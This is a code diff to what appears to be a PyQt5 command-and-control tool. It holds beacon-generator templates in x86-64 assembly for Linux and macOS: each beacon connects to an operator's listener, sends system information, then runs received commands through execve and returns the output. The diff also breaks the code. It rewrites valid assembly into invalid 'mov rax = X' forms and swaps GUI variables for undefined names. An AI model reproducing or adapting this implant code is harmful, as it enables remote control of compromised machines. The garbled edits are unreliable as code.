@@ -93,6 +93,7 @@ from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, 
 from PyQt5.QtWebEngineWidgets import QWebEngineView
 from PyQt5.QtWebChannel import QWebChannel
 from PyQt5.QtWebSockets import QWebSocketServer, QWebSocket
+
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 init(autoreset=True)
 LOG_JSON_PATH = "elaina_log.json"
@@ -2958,58 +2959,58 @@ _start:
     ; Connect to C2 server
     mov rax, 0x''' + bytes(str(ipaddress.IPv4Address(self.listener_info["host"])), 'utf-8') + b'''
     push rax
-    mov rax, 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''0000
+    mov rax = 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''0000
     push rax
-    mov rsi, rsp
+    mov rsi = rsp
     push 0x10
     pop rdx
     push rsi
     push rdi
-    mov al, 0x42
+    mov al = 0x42
     syscall
     
     ; Send system information
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x100
-    mov rax, 0x1
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x100
+    mov rax = 0x1
     syscall
     
     ; Main beacon loop
 beacon_loop:
     ; Receive commands
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x1000
-    mov rax, 0x0
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x1000
+    mov rax = 0x0
     syscall
     
     ; Execute command
-    mov rdi, rsp
-    xor rsi, rsi
-    xor rdx, rdx
+    mov rdi = rsp
+    xor rsi = rsi
+    xor rdx = rdx
     push rax
     push rdi
     push rsi
     push rdx
-    mov rax, 0x3b
+    mov rax = 0x3b
     pop rsi
     pop rdx
     pop rdi
     syscall
     
     ; Send result
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x1000
-    mov rax, 0x1
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x1000
+    mov rax = 0x1
     syscall
     
     ; Sleep
-    mov rax, 0x35
-    mov rdi, 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''
-    xor rsi, rsi
-    xor rdx, rdx
+    mov rax = 0x35
+    mov rdi = 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''
+    xor rsi = rsi
+    xor rdx = rdx
     syscall
     
     jmp beacon_loop
@@ -5097,7 +5098,7 @@ class MainWindow(QMainWindow):
         
         output_path_input = QLineEdit()
         output_path_input.setPlaceholderText("Path to save beacon")
-        layout.addRow("Output Path:", output_path_input)
+        layout.addRow("Output Path:", output_path)
         
         browse_button = QPushButton("Browse")
         browse_button.clicked.connect(lambda: output_path_input.setText(QFileDialog.getSaveFileName(dialog, "Save Beacon")[0]))
@@ -5111,7 +5112,7 @@ class MainWindow(QMainWindow):
             port = port_input.value()
             beacon_type = type_combo.currentText()
             ssl_enabled = ssl_checkbox.isChecked()
-            profile_path = profile_input.text() if profile_input.text() else None
+            profile_path = profile_input.text() if profile_path.text() else None
             sleep_time = sleep_input.value()
             jitter = jitter_input.value()
             stealth_mode = stealth_checkbox.isChecked()
@@ -5932,56 +5933,56 @@ _main:
     push rax
     mov rax, 0x{listener_info['port']:04x}0000
     push rax
-    mov rsi, rsp
+    mov rsi = rsp
     push 0x10
     pop rdx
     push rsi
     push rdi
-    mov rax, 0x2000000 + 0x62
+    mov rax = 0x2000000 + 0x62
     syscall
     
     ; Send system information
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x100
-    mov rax, 0x2000000 + 0x4
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x100
+    mov rax = 0x2000000 + 0x4
     syscall
     
     ; Main beacon loop
 beacon_loop:
     ; Receive commands
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x1000
-    mov rax, 0x2000000 + 0x3
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x1000
+    mov rax = 0x2000000 + 0x3
     syscall
     
     ; Execute command
-    mov rdi, rsp
-    xor rsi, rsi
-    xor rdx, rdx
+    mov rdi = rsp
+    xor rsi = rsi
+    xor rdx = rdx
     push rax
     push rdi
     push rsi
     push rdx
-    mov rax, 0x2000000 + 0x3b
+    mov rax = 0x2000000 + 0x3b
     pop rsi
     pop rdx
     pop rdi
     syscall
     
     ; Send result
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x1000
-    mov rax, 0x2000000 + 0x4
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x1000
+    mov rax = 0x2000000 + 0x4
     syscall
     
     ; Sleep
-    mov rax, 0x2000000 + 0x5d
-    mov rdi, 0x{listener_info['port']:08x}
-    xor rsi, rsi
-    xor rdx, rdx
+    mov rax = 0x2000000 + 0x5d
+    mov rdi = 0x{listener_info['port']:08x}
+    xor rsi = rsi
+    xor rdx = rdx
     syscall
     
     jmp beacon_loop
@@ -6424,56 +6425,56 @@ _start:
     push rax
     mov rax, 0x{listener_info['port']:04x}0000
     push rax
-    mov rsi, rsp
+    mov rsi = rsp
     push 0x10
     pop rdx
     push rsi
     push rdi
-    mov al, 0x42
+    mov al = 0x42
     syscall
     
     ; Send system information
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x100
-    mov rax, 0x1
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x100
+    mov rax = 0x1
     syscall
     
     ; Main beacon loop
 beacon_loop:
     ; Receive commands
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x1000
-    mov rax, 0x0
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x1000
+    mov rax = 0x0
     syscall
     
     ; Execute command
-    mov rdi, rsp
-    xor rsi, rsi
-    xor rdx, rdx
+    mov rdi = rsp
+    xor rsi = rsi
+    xor rdx = rdx
     push rax
     push rdi
     push rsi
     push rdx
-    mov rax, 0x3b
+    mov rax = 0x3b
     pop rsi
     pop rdx
     pop rdi
     syscall
     
     ; Send result
-    mov rdi, rax
-    mov rsi, rsp
-    mov rdx, 0x1000
-    mov rax, 0x1
+    mov rdi = rax
+    mov rsi = rsp
+    mov rdx = 0x1000
+    mov rax = 0x1
     syscall
     
     ; Sleep
-    mov rax, 0x35
-    mov rdi, 0x{listener_info['port']:08x}
-    xor rsi, rsi
-    xor rdx, rdx
+    mov rax = 0x35
+    mov rdi = 0x{listener_info['port']:08x}
+    xor rsi = rsi
+    xor rdx = rdx
     syscall
     
     jmp beacon_loop
